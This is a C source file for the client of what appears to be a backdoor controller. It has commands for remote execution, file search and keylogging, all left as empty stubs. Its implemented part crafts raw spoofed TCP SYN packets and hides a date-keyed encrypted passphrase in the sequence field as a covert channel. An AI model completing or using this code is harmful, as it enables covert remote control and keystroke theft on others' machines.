#include "client.h"

// Local prototypes
static int parseConfiguration(const char filePath[], netInfo *info);
static int getUserInput(char *commandData, int command);
static void executeSystemCall(netInfo *info, char *commandData);
static void findFile(netInfo *info, char *commandData);
static void keylogger(netInfo *info);
static void sendCommand(netInfo *info, char *commandData);

int main (int argc, char **argv)
{
    int option = 0;
    int command = -1;
    char configFile[PATH_MAX] = {"../settings.conf"};
    char commandData[PATH_MAX];
    char *temp = NULL;
    netInfo info;
    
    // Change the UID/GID to 0 (raise to root)
	if ((setuid(0) == -1) || (setgid(0) == -1))
    {
        systemFatal("You need to be root for this");
    }
    
    // Process the command line arguments
    while ((option = getopt (argc, argv, "f:c:")) != -1)
    {
        switch (option)
        {
            case 'f':
                snprintf(configFile, sizeof(configFile), "%s", optarg);
                break;
                
            case 'c':
                command = strtol(optarg, &temp, 10);
                break;
                
            default:
            case '?':
                fprintf(stderr, "Usage: %s -f [config file] -c [command type]", argv[0]);
                return 1;
        }   
    }
    
    // Read the configuration file
    parseConfiguration(configFile, &info);
    
    // If the command requires user input, obtain it
    if ((command == EXECUTE_SYSTEM_CALL) || (command == FIND_FILE))
    {
        if (!getUserInput(commandData, command))
            systemFatal("Unable to get user input");
    }
    
    // Determine the next function to call based on the command
    switch (command)
    {
        case EXECUTE_SYSTEM_CALL:
            executeSystemCall(&info, commandData);
            break;
            
        case FIND_FILE:
            findFile(&info, commandData);
            break;

        case KEYLOGGER:
            keylogger(&info);
            break;
        default:
            systemFatal("Unknown or missing command, check README for usage");
    }
    
    return 0;
}

static void executeSystemCall(netInfo *info, char *commandData)
{
    
}

static void findFile(netInfo *info, char *commandData)
{
    
}

static void keylogger(netInfo *info)
{
    
}

static void sendCommand(netInfo *info, char *commandData)
{
    char buffer[PCKT_LEN];
    char date[11];
    char *keyword = NULL;
    char *encryptedField = NULL;
    int sock = 0;
    int one = 1;
    const int *val = &one;
    struct ip *iph = (struct ip *) buffer;
    struct tcphdr *tcph = (struct tcphdr *) (buffer + sizeof(struct ip));
    struct sockaddr_in sin;
    struct sockaddr_in din;
    struct tm *timeStruct;
    time_t t;
    
    // Get the time and create the secret code
    time(&t);
    timeStruct = localtime(&t);
    strftime(date, sizeof(date), "%Y:%m:%d", timeStruct);
    keyword = strdup(PASSPHRASE);
    encryptedField = encrypt_data(keyword, date, 4);
    
    // Fill out the addess structs
    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;
    sin.sin_port = htons(*info->srcPort);
    din.sin_port = htons(*info->destPort);
    sin.sin_addr.s_addr = inet_addr((info->srcHost));
    din.sin_addr.s_addr = inet_addr((info->destHost));
    
    // Zero out the buffer
    memset(buffer, 0, PCKT_LEN);
    
    // IP structure
    iph->ip_hl = 5;
    iph->ip_v = 4;
    iph->ip_tos = 16;
    iph->ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
    iph->ip_id = htons(54321);
    iph->ip_off = 0;
    iph->ip_ttl = 64;
    iph->ip_p = 6;      // TCP
    iph->ip_sum = 0;    // Done by kernel
    
    iph->ip_src = sin.sin_addr;
    iph->ip_dst = din.sin_addr;
    
    // TCP structure
    tcph->th_sport = htons(*info->srcPort);
    tcph->th_dport = htons(*info->destPort);
    memcpy(buffer + sizeof(struct ip) + 4, encryptedField, sizeof(__uint32_t));
    tcph->th_ack = 0;
    tcph->th_off = 5;
    tcph->th_flags = TH_SYN;
    tcph->th_win = htons(32767);
    tcph->th_sum = 0;	// Done by kernel
    tcph->th_urp = 0;
    
    // Insert the command
    
    // IP checksum calculation
    iph->ip_sum = csum((unsigned short *) buffer, (sizeof(struct ip) + sizeof(struct tcphdr)));
    
    // Create the socket for sending the packets
    sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock == -1)
    {
        systemFatal("Error creating raw socket");
    }
    
    // Inform the kernel do not fill up the headers' structure, we fabricated our own
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        systemFatal("setsocketopt failed");
    }
    
    // Send the packet out
    if (sendto(sock, buffer, iph->ip_len, 0, (struct sockaddr *) &sin, sizeof(sin)) < 0)
    {
        systemFatal("sendto failed");
    }
    
    // Cleanup
    if (close(sock) == -1)
    {
        systemFatal("Unable to close the raw socket");
    }
    free(keyword);

}

static int getUserInput(char *commandData, int command)
{
    char *temp = NULL;
    
    // Prompt the user for the correct input
    if (command == EXECUTE_SYSTEM_CALL)
        printf("Enter command, max %d characters\n", PATH_MAX);
    else
        printf("Enter filename, max %d characters\n", PATH_MAX);
    
    // Obtain the entry
    if (fgets(commandData, PATH_MAX, stdin) != NULL)
    {
        // Remove the newline character if it exists
        if ((temp = strchr(commandData, '\n')) != NULL)
            *temp = '\0';
    }
    else
        return 0;
    return 1;
}

static int parseConfiguration(const char filePath[], netInfo *info)
{
    char line[PATH_MAX];
    int gotDestination = 0;
    FILE *file = NULL;
    
    // Open the configuration file
    if ((file = fopen(filePath, "r")) == NULL)
    {
        systemFatal("Unable to open the configuration file");
    }
    
    // While there are rule lines in the file
    while (fgets(line, sizeof(line), file))
    {
        // Skip commented lines
        if (line[0] == '#')
            continue;
        
        // Check to see if we have the first line, which should be destination
        if (gotDestination == 0)
        {
            if (sscanf(line, "%[^,],%d", info->destHost, info->destPort) == 2)
            {
                gotDestination = 1;
            }
            else
            {
                systemFatal("Invalid configuration file");
            }
        }
        else
        {
            // Must be the second line
            if (sscanf(line, "%[^,],%d", info->srcHost, info->srcPort) == 2)
            {
                // We have the second line, so get out
                break;
            }
            else
            {
                systemFatal("Invalid configuration file");
            }
        }
    }
    fclose(file);
    return 1;
}
